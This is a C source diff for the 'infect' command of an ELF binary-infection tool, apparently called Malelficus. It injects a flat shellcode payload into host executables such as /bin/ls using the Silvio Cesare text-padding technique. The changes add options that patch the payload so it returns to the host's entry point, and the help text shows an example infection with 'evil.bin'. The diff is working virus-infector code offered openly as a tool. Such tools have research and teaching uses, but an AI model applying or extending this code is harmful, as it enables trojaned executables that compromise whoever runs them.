@@ -44,7 +44,7 @@
 #include <malelf/infect.h>
 
 char *malelf_techniques[] = {
-        "silvio-cesare",
+        "silvio-text-padding",
         "nop"
 };
 
@@ -58,17 +58,19 @@ void malelf_infect_help()
         HELP("\n");
         HELP("This command is used to assist in the process of binary ");
         HELP("infection.\n");
-        HELP("Usage: malelf infect <options>\n");
-        HELP("         -h, --help    \tInfect Help\n");
-        HELP("         -i, --input   \tInput host file\n");
-        HELP("         -o, --output  \tOutput infected file\n");
-        HELP("         -m, --malware \tFLAT binary malware.\n");
-        HELP("         -t, --technique  \tTechnique to infect.");
-        HELP(" Default is 0 or 'silvio-text-padding'.\n");
-HELP("                          \tUse %s infect -l to list ", *g_argv);
+        HELP("Usage: %s infect <options>\n", *g_argv);
+        HELP("         -h, --help    \t\tInfect Help\n");
+        HELP("         -i, --input   \t\tInput host file\n");
+        HELP("         -o, --output  \t\tOutput infected file\n");
+        HELP("         -m, --malware \t\tFLAT binary malware.\n");
+        HELP("         -f, --offset-return\tOffset in shellcode to patch the host entrypoint\n");
+        HELP("         -a, --auto-shellcode\tAutomatically patch shellcode with host entrypoint\n");
+        HELP("         -t, --technique  \tTechnique to infect.\n");
+        HELP("                          \tUse %s infect -l to list ",
+             *g_argv);
         HELP("techniques available.\n");
         HELP("Example: %s infect -i /bin/ls -o myls -m evil.bin -t "
-        "'silvio-text-padding'\n", *g_argv);
+             "'%s'\n", *g_argv, malelf_techniques[0]);
         HELP("\n");
         exit(MALELF_SUCCESS);
 }
@@ -131,7 +133,7 @@ _u32 malelf_infect_verify_technique(MalelfInfect *obj)
                 return MALELF_ERROR;
         }
 
-        if (val >= 0 && val < (long) (sizeof (malelf_techniques)/sizeof(_u8))) {
+        if (val >= 0 && val < N_TECHNIQUES) {
                 obj->itech = (_u8) val;
         } else {
                 fprintf(stderr,
@@ -166,11 +168,6 @@ _u32 _malelf_infect_cesare(MalelfInfect *obj)
                 goto cesare_error;
         }
 
-/*        result = malelf_binary_open(&output, obj->ofname);
-        if (MALELF_SUCCESS != result) {
-                goto cesare_cleanup;
-                }*/
-
         if (MALELF_ELF32 == input.class) {
                 malware.class = MALELF_FLAT32;
                 malware_ready.class = MALELF_FLAT32;
@@ -187,23 +184,66 @@ _u32 _malelf_infect_cesare(MalelfInfect *obj)
                 goto cesare_error;
         }
 
-        malware_ready.fname = "/tmp/malelf_ready";
-        _u32 magic_offset = 0;
-        result = malelf_shellcode_create_flat(&malware_ready,
-                                              &malware,
-                                              &magic_offset,
-                                              0,
-                                              0);
+        if (obj->auto_shellcode) {
+                /* with --auto-shellcode the infector automatically
+                   call malelf_shellcode_* to patch the input shellcode
+                   with a JMP $MAGIC_BYTES that will be patched by
+                   infector. */
+                _u32 magic_offset = 0;
+                result = malelf_shellcode_create_flat(&malware_ready,
+                                                      &malware,
+                                                      &magic_offset,
+                                                      0,
+                                                      0);
 
-        if (MALELF_SUCCESS != result) {
-                goto cesare_error;
+                if (MALELF_SUCCESS != result) {
+                        goto cesare_error;
+                }
+                result = malelf_infect_silvio_padding32(&input,
+                                                        &output,
+                                                        &malware_ready,
+                                                        0,
+                                                        magic_bytes);
+        } else if (obj->offset_ret > 0) {
+                result = malelf_infect_silvio_padding32(&input,
+                                                        &output,
+                                                        &malware,
+                                                        obj->offset_ret,
+                                                        0);
+        } else {
+                /* Malelficus will search for the magic bytes in shellcode
+                   and if found he will patch with the host entry point.*/
+                union malelf_dword magic_bytes;
+                magic_bytes.long_val = MALELF_MAGIC_BYTES;
+                result = malelf_find_magic_number(malware.mem,
+                                                  malware.size,
+                                                  magic_bytes,
+                                                  &obj->offset_ret);
+                if (MALELF_SUCCESS != result) {
+                        MALELF_DEBUG_WARN("malelficus doesn't found the "
+                                          "magic bytes %08x in '%s'",
+                                          magic_bytes.long_val,
+                                          malware.fname);
+                        MALELF_LOG_WARN("malelf does not found the magic "
+                                        "bytes %08x in malware '%s'.\n",
+                                        magic_bytes.long_val,
+                                        malware.fname);
+                        MALELF_LOG_WARN("You can use -b/--magic-bytes to "
+                                        "specify another magic bytes in "
+                                        "malware or use -f/--offset-ret "
+                                        "to specify the exact offset in "
+                                        "malware where malelf could "
+                                        "overwrite with host entry point."
+                                );
+
+                }
+
+                result = malelf_infect_silvio_padding32(&input,
+                                                        &output,
+                                                        &malware,
+                                                        obj->offset_ret,
+                                                        0);
         }
-
-        result = malelf_infect_silvio_padding32(&input,
-                                                &output,
-                                                &malware_ready,
-                                                0,
-                                                magic_bytes);
 
         if (MALELF_SUCCESS != result) {
                 goto cesare_error;
@@ -292,6 +332,16 @@ static _u32 _malelf_infect_handle_options(MalelfInfect *obj,
         case INFECT_LIST:
                 _malelf_list_techniques();
                 exit(0);
+        case INFECT_OFFSETRET:
+                obj->offset_ret = (_u32) atoi(optarg);
+                if (obj->offset_ret == 0) {
+                        fprintf(stderr, "Invalid value to -f or --offset-return. Required > 0\n");
+                        return MALELF_ERROR;
+                }
+                break;
+        case INFECT_AUTOSHELLCODE:
+                obj->auto_shellcode = 1;
+                break;
         case ':':
                 printf("Unknown option character '%s'.\n", optarg);
                 break;
@@ -315,6 +365,8 @@ static _u32 _malelf_infect_options(MalelfInfect *obj)
                 {"output", 1, 0, INFECT_OUTPUT},
                 {"malware", 1, 0, INFECT_MALWARE},
                 {"technique", 1, 0, INFECT_TECHNIQUE},
+                {"offset-ret", 1, 0, INFECT_OFFSETRET},
+                {"auto-shellcode", 1, 0, INFECT_AUTOSHELLCODE},
                 {"list", 0, 0, INFECT_LIST},
                 {0, 0, 0, 0}
         };
@@ -324,9 +376,13 @@ static _u32 _malelf_infect_options(MalelfInfect *obj)
                 return MALELF_ERROR;
         }
 
-        while ((option = getopt_long (g_argc, g_argv, "hi:o:m:t:l",
+        while ((option = getopt_long (g_argc, g_argv, "hi:o:m:t:la",
                                       long_options, &option_index)) != -1) {
                 error = _malelf_infect_handle_options(obj, option);
+        }
+
+        if (obj->technique == NULL) {
+                obj->technique = malelf_techniques[0];
         }
 
         if (MALELF_SUCCESS == error ) {
@@ -334,9 +390,18 @@ static _u32 _malelf_infect_options(MalelfInfect *obj)
                     obj->ofname != NULL &&
                     obj->technique != NULL &&
                     obj->mfname != NULL) {
-                        error = _malelf_infect(obj);
+                        if (obj->offset_ret > 0 &&
+                            obj->auto_shellcode > 0) {
+                                HELP("Use -f/--offset-ret OR "
+                                     "-a/--auto-shellcode, never "
+                                     "both\n");
+                                return MALELF_ERROR;
+                        } else {
+                                /* Yes, we can infect now! */
+                                error = _malelf_infect(obj);
+                        }
                 } else {
-                        HELP("-i, -o, -t and -m are required!\n");
+                        HELP("-i, -o and -m are required!\n");
                         return MALELF_ERROR;
                 }
         }
@@ -356,6 +421,8 @@ _u32 malelf_infect_init(MalelfInfect *obj,
         obj->mfd = -1;
         obj->technique = NULL;
         obj->itech = -1;
+        obj->offset_ret = 0;
+        obj->auto_shellcode = 0;
 
         g_argc = argc;
         g_argv = argv;
